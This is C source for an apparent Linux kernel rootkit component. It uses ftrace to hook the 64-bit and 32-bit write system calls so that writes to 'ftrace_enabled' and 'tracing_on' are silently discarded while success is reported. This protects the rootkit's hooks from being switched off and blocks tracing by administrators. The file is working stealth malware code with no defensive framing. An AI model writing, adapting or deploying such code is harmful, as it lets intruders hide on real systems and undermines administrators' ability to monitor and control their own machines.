#include "../include/core.h"
#include "../include/hooks_write.h"
#include "../ftrace/ftrace_helper.h"

#define BUF_SIZE 4096

static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);

static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                     asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                     bool compat32)
{
    int fd;
    const char __user *user_buf;
    size_t count;

    if (!compat32) {
        fd       = regs->di;
        user_buf = (const char __user *)regs->si;
        count    = regs->dx;
    } else {
        fd       = regs->bx;
        user_buf = (const char __user *)regs->cx;
        count    = regs->dx;
    }

    struct file *file;
    char *kernel_buf;

    file = fget(fd);
    if (!file)
        return orig(regs);

    const char *name = file->f_path.dentry->d_name.name;

    if (strcmp(name, "ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0) {
        fput(file);

        kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
        if (!kernel_buf)
            return -ENOMEM;

        if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
            kfree(kernel_buf);
            return -EFAULT;
        }

        kfree(kernel_buf);

        return count;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_write, false);
}

static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
{
    return hooked_write_common(regs, original_write32, true);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_write",  hooked_write,  &original_write),
    HOOK("__ia32_sys_write", hooked_write32, &original_write32),
};

notrace int hooks_write_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hooks_write_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
